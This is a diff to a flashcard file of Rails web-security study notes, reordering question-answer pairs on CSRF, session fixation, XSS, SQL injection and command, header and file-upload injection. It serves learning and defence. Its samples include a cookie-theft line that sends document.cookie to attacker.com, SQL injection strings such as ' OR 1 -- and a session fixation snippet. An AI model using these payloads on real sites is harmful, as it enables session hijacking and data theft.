@@ -1,5 +1,16 @@
-"unencrypted wireless LAN": example where it's very easy to sniff a cookie.
-"config.force_ssl = true": how to force HTTPS
+# forgery
+
+"map GET/POST appropriately; protect_from_forgery :secret => ...;, use csrf_meta_tags": describe protections from CSRF
+protect_from_forgery: almost mandatory directive for security in ApplicationController
+"to let non-remote links with :method work with protect_from_forgery": why would you want to include csrf_meta_tags?
+"includes secret token into forms & ajax requests": what does protect_from_forgery do?
+"Victim's browser loads harmful link (posted by attacker) on one site to another site": explain CSRF
+"skip_before_filter :verify_authenticity_token": how to selectively disable protection from CSRF
+"attacker puts post with <img src='si.te/harmful'>; victim is authenticated on si.te; victim opens the post; si.te/harmful is successfully requested": describe CSRF steps
+
+# session and cookies
+
+"unencrypted wireless LAN": Give an example where it's very easy to sniff a cookie.
 "clear out the cookies after work": advise when working at a public terminal
 "log-out button must be prominent": advice to protect users who work from public terminal
 "critial data and large objects": what one should not store in session?
@@ -8,39 +19,49 @@
 "avoid storing credits in session": how to protect from replay attack
 "force a victim's browser to use a session id know to attacker": the idea of session fixation attack
 "load a page to get session id; maintain session; inject document.cookie=<id> into a page; lure victim to the infected page": session fixation attack steps
+"document.write('<img src=\"http://attacker.com/'+document.cookie+'\">')": give example of cookie theft
 "document.cookie='_session_id=xxx'": What is the code for session fixation
 "reset_session after login, save user-specific data like remote IP or user agent, session expiry": how to couteract session fixation?
 "session fixation, session hijacking": which attacks can counteract reset_session?
-"reset_session removes any valuefrom the session": what is problem with reset_session for app logic?
-"if a user is behind a proxy, remote IP might change over the course of a session": What is a problem with saving remote IP?
+"reset_session removes any value from the session": what is problem with reset_session for app logic?
 "csrf, session hijacking and session fixation": which attacks are easier with session that never expire?
 "Session.delete_all \"updated_at < '#{time.ago.to_s :db}'\"": Expire ActiveRecordStore sessions
-"Victim's browser loads harmful link (posted by attacker) on one site to another site": explain CSRF
-"attacker puts post with <img src='si.te/harmful'>; victim is authenticated on si.te; victim opens the post; si.te/harmful is successfully requested": describe CSRF steps 
-"use GET/POST appropriately; protect_from_forgery :secret => ...;": describe protections from CSRF
-"includes secret token into forms & ajax requests": what does protect_from_forgery do?
+
+# injections
+
 "introduce malicious code/parameters to run in secure context": meaning of injection
-"XSS & SQL injection": examples of injection
-"attr_protected": what is black-list analog of attr_accessible?
-"whitelist over blacklist": what is principle when sanitizing or validating something?
-"rejecting over correcting": what is approach to dangerous input?
+"XSS, SQL, header, command line, CSS, attachment file name": examples of injection
+"steal cookie, fixate a session, hijack a session, redirect to a fake website, fake elemets to get confidential information, display ads, install malicious software": give examples of what can XSS do?
+"escape output": protection from XSS?
+"sanitize, escapeHTML": helpers that can help to counteract XSS
+"escape any input with h() right in action": how to make AJAX XSS-protected?
 "' OR 1 --": give an example of SQL injection?
-"get hidden data; bypass authorization;
 "'|OR 1=1|UNION|--": elements of SQL-injection parameters (for testing)
 "don't use .where('#{...}')": countermeasure against SQL injection
 "URL parameter": source of XSS injection
 "attacker injects a script into parameter, application saves it and displays to a victim": define the essense of XSS
-"steal cookie, fixate a session, hijack a session, redirect to a fake website, fake elemets to get confidential information, display ads, install malicious software": give examples of what can XSS do?
-"document.write('<img src=\"http://attacker.com/'+document.cookie+'\">')": give example of cookie theft
-"blacklists are never complete": what is the problems with blacklists for security?
-"escape output": protection from XSS?
 "sanitize": Rails helper that filters unwanted tags from HTML
 "escapeHTML, h": methods that replaces HTML markup with escape sequences
-"sanitize, escapeHTML": helpers that can help to counteract XSS
+"combine RedCloth and sanitize": how to make RedCloth safe?
+"yes, rails escapes argument of redirect to": Is it safe to do redirect_to params[:url]?
 "it uses possibility to inject JavaScript into CSS": the idea of CSS injection
 "sanitize_css":  helper to protect from CSS injection
-"combine RedCloth and sanitize": how to make RedCloth safe?
-"escape any input with h() right in action": how to make AJAX XSS-protected?
 "use ; or | symbols to make command line parameter as separate command": idea of command line injection
 "use system(command, args)": how to protect from command-line injection
 "escape when building response headers from user input": how to counteract header injection
+file path may contain /, ~, .. and overwrite some files that should not: what is the security threat when uploading a file?
+
+# protections
+
+put it to a subdomain, use SSL, expire session: How to protect security-sensitive functionality like admin interface against session-based attacks?
+
+# misc
+
+"config.force_ssl = true": how to force HTTPS
+"if a user is behind a proxy, remote IP might change over the course of a session": What is a problem with saving remote IP?
+"attr_protected": what is black-list analog of attr_accessible?
+"whitelist over blacklist; reject malformed input instead of correcting it": what are 2 principles when sanitizing or validating something?
+"rejecting over correcting": what is approach to dangerous input?
+"blacklists are never complete": what is the problems with blacklists for security?
+
+# append
